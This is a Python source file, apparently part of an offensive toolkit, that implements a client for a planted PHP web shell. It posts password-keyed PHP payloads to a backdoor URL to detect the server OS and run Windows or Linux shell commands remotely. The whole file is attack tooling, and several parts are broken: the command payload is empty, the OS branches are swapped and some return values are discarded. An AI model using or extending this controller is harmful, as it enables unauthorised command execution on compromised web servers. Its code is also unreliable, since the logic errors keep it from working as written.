from SpiritCore.System import *
import requests,re,base64

ExecuteCmd="""
    

"""
ExecWinodwsCmd="cd /d \"%s\"&%s&echo [S]&cd&echo [E]"
ExecLinuxBashe="cd \"%s\";%s;echo [S];pwd;echo [E]"
GetInfo="@ini_set('display_errors', '0');@set_time_limit(0);function asenc($out){return $out;};function asoutput(){$output=ob_get_contents();ob_end_clean();echo '<Start>';echo @asenc($output);echo '<End>';}ob_start();  try{ echo PHP_OS;}catch(Exception $e){echo 'ERROR://'.$e->getMessage();};asoutput();die();"





class PhpBackdoor:
    cryp=0 # 0 base64              Not Support 1  rsa  2 xor
    SystemVersion=0
    URL=""
    RequestsObject=None
    UseSession=False
    Password="pass"
    ServerOs=0
    def Connect(self):
        if self.URL!="":
            try:
                if self.UseSession==True:
                    self.RequestsObject=requests.session()
                    self.RequestsObject = requests.get(self.URL)
                else:
                    self.RequestsObject=requests.get(self.URL)
            except:
                return False
            else:
                if self.RequestsObject.status_code==200:
                    return True


    def Payload(self,Type=0):
        if Type==0: #GetInfo
            Payload=GetInfo
        elif Type==1: #GetInfo
            Payload=ExecuteCmd
        if self.cryp==0:
            Payload.replace("<ENCODE> ","return $data;")

        return  Payload
    def SendData(self,Data):
        if self.UseSession==True:
            self.RequestsObject.post(self.URL,data=Data)
        else:
            self.RequestsObject = requests.post(self.URL, data=Data)

        if self.RequestsObject.status_code == 200:
            return self.RequestsObject.text

        else:
            print_error("Error:%d",self.RequestsObject.status_code)
            return "Error"
    def GetInfo(self):
        Data = self.Payload(0)
        Send={
            self.Password:Data
        }
        OS =self.SendData(Send)
        # print(self.RequestsObject.content)
        Values = re.findall(r'<Start>(.*)<End>', OS)
        if Values == "Windows":
            self.ServerOs = 1
        else:
            self.ServerOs = 0
            #print("Linux")
        #self.Exec()
    def Exec(self,Path,Cmd):
        Data =self.Payload(1)
        if self.ServerOs==1:
            Send ={
            self.Password: Data,
            "Dos":ExecLinuxBashe%("/var/www/html","ls"),
            }
        else:
            Send = {
                self.Password: Data,
                "Dos": ExecWinodwsCmd % (Path, Cmd),
            }

        self.SendData(Send)



class Session:
    UUID=""
    Object=None
    TargetType=0
    def __init__(self,Object):
        self.Object=Object